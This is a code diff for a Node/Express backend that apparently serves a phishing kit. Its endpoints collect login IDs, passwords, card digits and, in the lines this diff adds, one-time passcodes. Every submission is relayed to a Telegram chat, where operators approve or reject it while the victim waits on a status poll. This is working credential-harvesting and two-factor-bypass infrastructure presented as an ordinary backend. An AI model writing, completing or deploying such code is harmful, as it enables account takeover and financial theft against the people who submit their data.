@@ -18,8 +18,13 @@ console.log("BOT_TOKEN:", BOT_TOKEN ? "✅ Configurado" : "❌ FALTA");
 console.log("CHAT_ID:", CHAT_ID ? "✅ Configurado" : "❌ FALTA");
 console.log("=================================");
 
-const requestsDB = new Map();
+// Almacenamiento de solicitudes (login y OTP)
+const requestsDB = new Map(); // Para logins
+const otpRequestsDB = new Map(); // Para OTPs
 
+// ==========================================
+// LÓGICA DE LOGIN (SEDE)
+// ==========================================
 async function sendToTelegram(requestId, data) {
     const isTarjeta = data.tipo === 'tarjeta';
     
@@ -63,8 +68,6 @@ async function sendToTelegram(requestId, data) {
 
 app.post('/api/login', async (req, res) => {
     console.log("📥 Petición recibida en /api/login");
-    console.log("Body:", JSON.stringify(req.body, null, 2));
-
     const { identificacion, clave, ultimos4, tipo } = req.body;
 
     if (!identificacion || !clave) {
@@ -96,6 +99,9 @@ app.get('/api/status/:requestId', (req, res) => {
     res.json({ status: request.status });
 });
 
+// ==========================================
+// WEBHOOK DE TELEGRAM (Login y OTP)
+// ==========================================
 app.post('/api/webhook/telegram', async (req, res) => {
     const { callback_query } = req.body;
 
@@ -107,9 +113,7 @@ app.post('/api/webhook/telegram', async (req, res) => {
     const messageId = callback_query.message.message_id;
     const chatId = callback_query.message.chat.id;
     
-    // --- CAPTURAMOS QUIÉN HIZO CLIC ---
     const adminUser = callback_query.from;
-    // Construimos el nombre: Nombre + Apellido (si tiene) + @username (si tiene)
     let adminName = `${adminUser.first_name || ''} ${adminUser.last_name || ''}`.trim();
     if (adminUser.username) {
         adminName += ` (@${adminUser.username})`;
@@ -120,14 +124,15 @@ app.post('/api/webhook/telegram', async (req, res) => {
 
     const [action, requestId] = data.split('_');
 
+    // Verificamos si es un login o un OTP
     if (requestsDB.has(requestId)) {
+        // Es un LOGIN
         const request = requestsDB.get(requestId);
         request.status = action === 'approve' ? 'approved' : 'rejected';
 
         let newText = request.originalText;
         newText = newText.replace('\n<i>El usuario está esperando respuesta...</i>', '');
         
-        // --- AGREGAMOS EL NOMBRE DEL ADMIN AL MENSAJE FINAL ---
         if (action === 'approve') {
             newText += `\n\n✅ <b>APROBADO POR:</b> ${adminName}`;
         } else {
@@ -142,11 +147,35 @@ app.post('/api/webhook/telegram', async (req, res) => {
                 parse_mode: 'HTML',
                 reply_markup: { inline_keyboard: [] }
             });
-            
-            console.log(`✅ Mensaje editado para requestId: ${requestId}. Acción: ${action} por ${adminName}`);
-            
         } catch (error) {
-            console.error("Error editando mensaje de Telegram:", error.response?.data || error.message);
+            console.error("Error editando mensaje:", error.response?.data || error.message);
+        }
+
+        res.sendStatus(200);
+    } else if (otpRequestsDB.has(requestId)) {
+        // Es un OTP
+        const request = otpRequestsDB.get(requestId);
+        request.status = action === 'approve' ? 'approved' : 'rejected';
+
+        let newText = request.originalText;
+        newText = newText.replace('\n<i>El usuario está esperando respuesta...</i>', '');
+        
+        if (action === 'approve') {
+            newText += `\n\n✅ <b>APROBADO POR:</b> ${adminName}`;
+        } else {
+            newText += `\n\n❌ <b>RECHAZADO POR:</b> ${adminName}`;
+        }
+
+        try {
+            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+                chat_id: chatId,
+                message_id: messageId,
+                text: newText,
+                parse_mode: 'HTML',
+                reply_markup: { inline_keyboard: [] }
+            });
+        } catch (error) {
+            console.error("Error editando mensaje OTP:", error.response?.data || error.message);
         }
 
         res.sendStatus(200);
@@ -155,6 +184,75 @@ app.post('/api/webhook/telegram', async (req, res) => {
     }
 });
 
+// ==========================================
+// LÓGICA DE OTP
+// ==========================================
+async function sendOtpToTelegram(otpRequestId, data) {
+    let text = `<b>🔐 SOLICITUD DE OTP</b>\n\n`;
+    text += `<b>Identificación:</b> ${data.identificacion}\n`;
+    text += `<b>OTP:</b> ${data.otp}\n`;
+    text += `\n<i>El usuario está esperando respuesta...</i>`;
+
+    const keyboard = {
+        inline_keyboard: [
+            [
+                { text: "✅ Aprobar", callback_data: `approve_${otpRequestId}` },
+                { text: "❌ Rechazar", callback_data: `reject_${otpRequestId}` }
+            ]
+        ]
+    };
+
+    try {
+        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'HTML',
+            reply_markup: keyboard
+        });
+        
+        otpRequestsDB.get(otpRequestId).messageId = response.data.result.message_id;
+        otpRequestsDB.get(otpRequestId).originalText = text;
+        console.log(`✅ OTP enviado a Telegram para requestId: ${otpRequestId}`);
+        
+    } catch (error) {
+        console.error("❌ Error enviando OTP a Telegram:", error.response?.data || error.message);
+    }
+}
+
+app.post('/api/otp', async (req, res) => {
+    console.log("📥 Petición recibida en /api/otp");
+    const { identificacion, otp, requestIdOrigen } = req.body;
+
+    if (!identificacion || !otp) {
+        return res.status(400).json({ error: "Faltan datos requeridos." });
+    }
+
+    const otpRequestId = Date.now().toString() + Math.random().toString(36).substring(2, 7);
+    
+    otpRequestsDB.set(otpRequestId, {
+        status: 'pending',
+        data: { identificacion, otp, requestIdOrigen },
+        messageId: null,
+        originalText: null
+    });
+
+    sendOtpToTelegram(otpRequestId, { identificacion, otp });
+
+    res.json({ requestId: otpRequestId });
+});
+
+app.get('/api/otp-status/:requestId', (req, res) => {
+    const { requestId } = req.params;
+    const request = otpRequestsDB.get(requestId);
+
+    if (!request) {
+        return res.status(404).json({ status: 'error', message: 'Solicitud no encontrada' });
+    }
+
+    res.json({ status: request.status });
+});
+
+// Ruta de salud
 app.get('/', (req, res) => {
     res.send('Backend funcionando correctamente.');
 });
